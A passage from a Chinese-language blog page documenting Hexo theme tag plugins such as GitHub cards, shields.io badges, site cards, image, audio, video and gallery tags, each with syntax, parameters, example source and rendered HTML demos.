class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard fomalhaut1998 %&#125; | &#123;% ghcard fomalhaut1998, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=buefy %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=onedark %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=algolia %&#125; | &#123;% ghcard fomalhaut1998, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><p>2.仓库信息卡片</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis %&#125;                | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=vue %&#125;             |</span><br><span class="line">| ---------------------------------------------------------- | ------------------------------------------------------------------ |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=buefy %&#125;   | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=onedark %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-dark %&#125;  |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=algolia %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=calm %&#125;            |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.用户信息卡片</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=calm&show_owner=true"/></a></td></tr></tbody></table><p>2.仓库信息卡片</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=calm&show_owner=true"/></a></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-13-github-徽标-ghbdage">2.13 github 徽标 ghbdage</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage [right],[left],[logo]||[color],[link],[title]||[option] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>left</code>：徽标左边的信息，必选参数。</li><li><code>right</code>: 徽标右边的信息，必选参数，</li><li><code>logo</code>：徽标图标，图标名称详见<a href="https://simpleicons.org/">simpleicons</a>，可选参数。</li><li><code>color</code>：徽标右边的颜色，可选参数。</li><li><code>link</code>：指向的链接，可选参数。</li><li><code>title</code>：徽标的额外信息，可选参数。主要用于优化 SEO，但<code>object</code>标签不会像<code>a</code>标签一样在鼠标悬停显示<code>title</code>信息。</li><li><code>option</code>：自定义参数，支持<a href="https://shields.io/">shields.io</a>的全部 API 参数支持，具体参数可以参看上文中的拓展写法示例。形式为<code>name1=value2&amp;name2=value2</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.基本参数,定义徽标左右文字和图标</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Theme,Butterfly %&#125;</span><br><span class="line">&#123;% bdage Frame,Hexo,hexo %&#125;</span><br></pre></td></tr></table></figure><p>2.信息参数，定义徽标右侧内容背景色，指向链接</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage CDN,JsDelivr,jsDelivr||abcdef,https://metroui.org.ua/index.html,本站使用JsDelivr为静态资源提供CDN加速 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割</span><br><span class="line">&#123;% bdage Source,GitHub,GitHub||,https://github.com/ %&#125;</span><br></pre></td></tr></table></figure><p>3.拓展参数，支持 shields 的 API 的全部参数内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Hosted,Vercel,Vercel||brightgreen,https://vercel.com/,本站采用双线部署，默认线路托管于Vercel||style=social&amp;logoWidth=20 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割</span><br><span class="line">&#123;% bdage Hosted,Vercel,Vercel||||style=social&amp;logoWidth=20&amp;logoColor=violet %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.基本参数,定义徽标左右文字和图标</p><p><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Butterfly-Theme-orange?logo=&color=orange&link=&"></object><br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Hexo-Frame-orange?logo=hexo&color=orange&link=&"></object></p><p>2.信息参数，定义徽标右侧内容背景色，指向链接</p><p><object class="ghbdage" style="margin-inline:5px" title="本站使用JsDelivr为静态资源提供CDN加速" standby="loading..." data="https://img.shields.io/badge/JsDelivr-CDN-orange?logo=jsDelivr&color=abcdef&link=https://metroui.org.ua/index.html&"></object><br>//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/GitHub-Source-orange?logo=GitHub&color=orange&link=https://github.com/&"></object></p><p>3.拓展参数，支持 shields 的 API 的全部参数内容</p><p><object class="ghbdage" style="margin-inline:5px" title="本站采用双线部署，默认线路托管于Vercel" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=brightgreen&link=https://vercel.com/&style=social&logoWidth=20"></object><br>//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=orange&link=&style=social&logoWidth=20&logoColor=violet"></object></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-14-网站卡片-sites">2.14 网站卡片 sites</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site xaoxuu, url=https://xaoxuu.com, screenshot=https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg, avatar=https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/avatar/avatar.png, description=简约风格 %&#125;</span><br><span class="line">&#123;% site inkss, url=https://inkss.cn, screenshot=https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg, avatar=https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site MHuiG, url=https://blog.mhuig.top, screenshot=https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png, avatar=https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Colsrch, url=https://colsrch.top, screenshot=https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png, avatar=https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Linhk1606, url=https://linhk1606.github.io, screenshot=https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png, avatar=https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="site-card-group"><a class="site-card" href="https://fomalhaut1998.com"><div class="img"><img src="https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/avatar/avatar.png"/><span class="title">fomalhaut1998</span><span class="desc">简约风格</span></div></a><a class="site-card" href="https://inkss.cn"><div class="img"><img src="https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg"/><span class="title">inkss</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://blog.mhuig.top"><div class="img"><img src="https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png"/><span class="title">MHuiG</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://colsrch.top"><div class="img"><img src="https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg"/><span class="title">Colsrch</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://linhk1606.github.io"><div class="img"><img src="https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png"/></div><div class="info"><img src="https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png"/><span class="title">Linhk1606</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-15-行内图片-inlineimage">2.15 行内图片 inlineimage</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% inlineimage 图片链接, height=高度（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>高度</code>：height=20px</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif %&#125; 一段话。</span><br><span class="line"></span><br><span class="line">这又是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif, height=40px %&#125; 一段话。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>这是 <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif" style="height:1.5em"/> 一段话。</p><p>这又是 <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif" style="height:40px;"/> 一段话。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-16-单张图片-image">2.16 单张图片 image</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image 链接, width=宽度（可选）, height=高度（可选）, alt=描述（可选）, bg=占位颜色（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>图片宽度高度：width=300px, height=32px</li><li>图片描述：alt=图片描述（butterfly 需要在主题配置文件中开启图片描述）</li><li>占位背景色：bg=#f2f2f2</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.添加描述：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure><p>2.指定宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px %&#125;</span><br></pre></td></tr></table></figure><p>3.指定宽度并添加描述：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure><p>4.设置占位背景色：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, bg=#1D0C04, alt=优化不同宽度浏览的观感 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.添加描述：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div>2..指定宽度<div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" style="width:400px;"/></div></div> 3.指定宽度并添加描述：<div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。" style="width:400px;"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div> 4.设置占位背景色：<div class="img-wrap"><div class="img-bg" style="background:#1D0C04"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="优化不同宽度浏览的观感" style="width:400px;"/></div><span class="image-caption">优化不同宽度浏览的观感</span></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-17-音频-audio">2.17 音频 audio</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio 音频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="audio"><audio controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3' type='audio/mp3'>Your browser does not support the audio tag.</audio></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-18-视频-video">2.18 视频 video</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video 视频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>对齐方向</code>：left, center, right</li><li><code>列数</code>：逗号后面直接写列数，支持 1 ～ 4 列。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.100%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br></pre></td></tr></table></figure><p>2.50%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 2 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><p>3.25%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 4 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.100%宽度</p><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div>2.50%宽度<div class="videos" col='2'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div>3.25%宽度<div class="videos" col='4'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-19-相册-gallery">2.19 相册 gallery</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery 相册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">markdown 圖片格式</span><br><span 